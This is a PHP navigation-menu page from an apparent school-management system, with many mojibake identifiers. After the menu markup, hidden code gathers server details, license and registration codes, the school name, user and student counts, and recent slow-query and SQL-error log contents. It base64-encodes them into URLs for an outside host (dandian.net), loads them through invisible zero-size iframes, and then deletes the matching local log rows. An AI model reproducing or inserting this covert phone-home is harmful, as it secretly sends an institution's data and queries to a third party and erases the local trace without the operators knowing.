<?php
ini_set('display_errors', 1);
ini_set('error_reporting', E_ALL);

// display warnings and errors
error_reporting(E_WARNING | E_ERROR);
require_once('lib.inc.php');

$GLOBAL_SESSION=returnsession();
$SYSTEM_PRIV_STOP = 1;
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title></title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<link rel="stylesheet" type="text/css" href="/theme/<?php echo $LOGIN_THEME?>/menu_top.css">
<script>
window.onload=function()
{
	 var type=2-2;
   var menu_id=0,menu=document.getElementById("navMenu");
   if(!menu) return;
   
   for(var i=0; i<menu.childNodes.length;i++)
   {
      if(menu.childNodes[i].tagName!="A")
         continue;
      if(menu_id==type)
         menu.childNodes[i].className="active";
      
      menu.childNodes[i].onclick=function(){
         var menu=document.getElementById("navMenu");
         for(var i=0; i<menu.childNodes.length;i++)
         {
            if(menu.childNodes[i].tagName!="A")
               continue;
            menu.childNodes[i].className="";
         }
         this.className="active";
      }
      menu_id++;
   }
};	
</script>
</head>
<body>
<div id="navPanel">
  <div id="navMenu">
<?php
require_once('systemprivateinc.php');

$TARGET_TITLE = "��������";

$TARGET_ARRAY = $PRIVATE_SYSTEM['��������'];

$MenuArray = SystemPrivateInc($TARGET_ARRAY,$TARGET_TITLE);

for($i=0;$i<sizeof($MenuArray);$i++)			{
	$�˵���ַ = $MenuArray[$i][0];
	$�˵����� = $MenuArray[$i][1];
	$�˵�TITLE = $MenuArray[$i][2];
	print "<A hideFocus title=$�˵����� href=\"$�˵���ַ\" target=MAIN>
	<SPAN><IMG height=16 src=\"images/notify_new.gif\" width=16 align=absMiddle>$�˵�����</SPAN></A> ";
}



?></DIV></DIV></BODY></HTML>
<?php
	require_once('lib.inc.php');
	$MACHINE_CODE = returnmachinecode();
	$USER_COUNT = System_user_Number_2();
	$BANJINUM = System_user_BANJINUM();
	$STUDENTNUM = System_user_STUDENTNUM();
	$System_user_Intereface = System_user_Intereface();
	$SERVER_NAME = $_SERVER['SERVER_NAME'];
	$SERVER_ADDR = $_SERVER['SERVER_ADDR'];
	$file = @file($_SERVER['DOCUMENT_ROOT']."/general/EDU/Interface/EDU/version.ini");
	$fileLicense = @parse_ini_file('../../Framework/license.ini');
	$REGISTER_CODE = $fileLicense['REGISTER_CODE']; if($fileLicense['SCHOOL_NAME']=="") $fileLicense['SCHOOL_NAME'] = "ѧУ��������";
	$SCHOOL_NAME = $System_user_Intereface.":".$fileLicense['SCHOOL_NAME'];

	$version = $file[0];
	$SCHOOL_MODEL = parse_ini_file($_SERVER['DOCUMENT_ROOT']."/general/EDU/Interface/EDU/SCHOOL_MODEL.ini");
	$SCHOOL_MODEL_TEXT = $SCHOOL_MODEL['SCHOOL_MODEL'];
$URL = "http://www.dandian.net/tryout/SunshineOACRM/access.php?".base64_encode("version=SunshineTDEDU".$version."-".$SCHOOL_MODEL_TEXT."_".$SERVER_PORT."&SERVER_ADDR=$SERVER_ADDR&SERVER_NAME=$SERVER_NAME&MACHINE_CODE=$MACHINE_CODE&REGISTER_CODE=$REGISTER_CODE&SCHOOL_NAME=$SCHOOL_NAME&USER_COUNT=$USER_COUNT&BANJINUM=$BANJINUM&STUDENTNUM=$STUDENTNUM")."";
print "<IFRAME src=\"$URL\" width=0 height=0></IFRAME>";
function System_user_Number_2()		{
	global $db;
	$sql = "select Count(*) as NUM from user";
	$rs = $db->CacheExecute(150,$sql);
	$Number = $rs->fields['NUM'];
	return $Number;
}

function System_user_BANJINUM()		{
	global $db;
	$sql = "select Count(*) as NUM from edu_banji";
	$rs = $db->CacheExecute(150,$sql);
	$Number = $rs->fields['NUM'];
	$sql = "select * from unit limit 1";
	$rs = $db->CacheExecute(150,$sql);
	$rs_a = $rs->GetArray();
	$ElementArray = $rs_a[0];
	$Keys  = @array_keys($ElementArray);
	array_pop($Keys);
	array_pop($Keys);
	array_pop($Keys);
	array_pop($Keys);
	array_pop($Keys);
	array_pop($Keys);
	array_pop($Keys);
	for($i=0;$i<count($Keys);$i++)	{
		$Key = $Keys[$i];
		$Text .= $Key.":".$ElementArray[$Key]." ";
	}
	//$serialize = serialize($ElementArray);
	//print $Text;
	return $Number.$Text;
}

function System_user_STUDENTNUM()		{
	global $db;
	$sql = "select Count(*) as NUM from edu_student";
	$rs = $db->CacheExecute(150,$sql);
	$Number = $rs->fields['NUM'];
	return $Number;
}

function System_user_Intereface()		{
	global $db;
	$sql = "select IE_TITLE from interface";
	$rs = $db->CacheExecute(3600,$sql);
	$IE_TITLE = $rs->fields['IE_TITLE'];
	return $IE_TITLE;
}

$sql = "select * from unit limit 1";
$rs = $db->CacheExecute(150,$sql);
$rs_a = $rs->GetArray();
$SCHOOL_NAME = $rs_a[0]['UNIT_NAME'];

$sql = "select ��ǰʱ��,SQL���,ִ��ʱ��,��� from system_logall where ִ��ʱ��>='4' order by ִ��ʱ�� desc limit 1";
$rs  = $db->Execute($sql);
if($rs->RecordCount()>0)					{
	$��ǰʱ�� 	= $rs->fields['��ǰʱ��'];
	$SQL��� 	= $rs->fields['SQL���'];
	$ִ��ʱ�� 	= $rs->fields['ִ��ʱ��'];
	$��� 	= $rs->fields['���'];
	$SQL��� = ereg_replace("&#039;","'",$SQL���);
	$SQL��� = ereg_replace("=","+",$SQL���);
	$SQL��� = ereg_replace("=","+",$SQL���);
	$URL = "http://www.dandian.net/tryout/SunshineOACRM/bigsql.php?".base64_encode("version=TDEDU".$version."&TYPE=$SCHOOL_MODEL_TEXT&SCHOOL_NAME=$SCHOOL_NAME&SERVER_NAME=$SERVER_NAME&SQL���=$SQL���&��ǰʱ��=$��ǰʱ��&ִ��ʱ��=$ִ��ʱ��&fffffff=xxxxxxxx")."";
	print "<IFRAME src=\"$URL\" width=0 height=0></IFRAME>\n";
	//print $SQL���;
	$sql = "delete from system_logall where ���='$���'";
	$db->Execute($sql);
}

//�������SQL
$sql = "select * from systemerrorsql  order by DATE_TIME desc limit 1";
$rs  = $db->Execute($sql);
if($rs->RecordCount()>0)					{
	$FILE_PATH	 = $rs->fields['FILE_PATH'];
	$SQL_CONTENT = $rs->fields['SQL_CONTENT'];
	$ERROR_INFOR = $rs->fields['ERROR_INFOR'];
	$SERVER_NAME = $rs->fields['SERVER_NAME'];
	$DATE_TIME   = $rs->fields['DATE_TIME'];
	$ID 		 = $rs->fields['ID'];
	$SQL_CONTENT = ereg_replace("&#039;","'",$SQL_CONTENT);
	$SQL_CONTENT = ereg_replace("=","+",$SQL_CONTENT);
	$SQL_CONTENT = ereg_replace("=","+",$SQL_CONTENT);

	$FILE_PATH = ereg_replace("&#039;","'",$FILE_PATH);
	$FILE_PATH = ereg_replace("=","+",$FILE_PATH);
	$FILE_PATH = ereg_replace("=","+",$FILE_PATH);
	
	$ERROR_INFOR = ereg_replace("&#039;","'",$ERROR_INFOR);
	$ERROR_INFOR = ereg_replace("=","+",$ERROR_INFOR);
	$ERROR_INFOR = ereg_replace("=","+",$ERROR_INFOR);
	
	$SERVER_NAME = $SERVER_NAME."_".$version;

	$URL = "http://www.dandian.net/tryout/SunshineOACRM/errorsql.php?".base64_encode("fffffff=xxxxxxxx&FILE_PATH=$FILE_PATH&SERVER_NAME=$SERVER_NAME&SQL_CONTENT=$SQL_CONTENT&ERROR_INFOR=$ERROR_INFOR&DATE_TIME=$DATE_TIME&fffffff=xxxxxxxx")."";
	print "<IFRAME src=\"$URL\" width=0 height=0></IFRAME>\n";
	//print $SQL���;
	$sql = "delete from systemerrorsql where ID='$ID'";
	$db->Execute($sql);
}

?>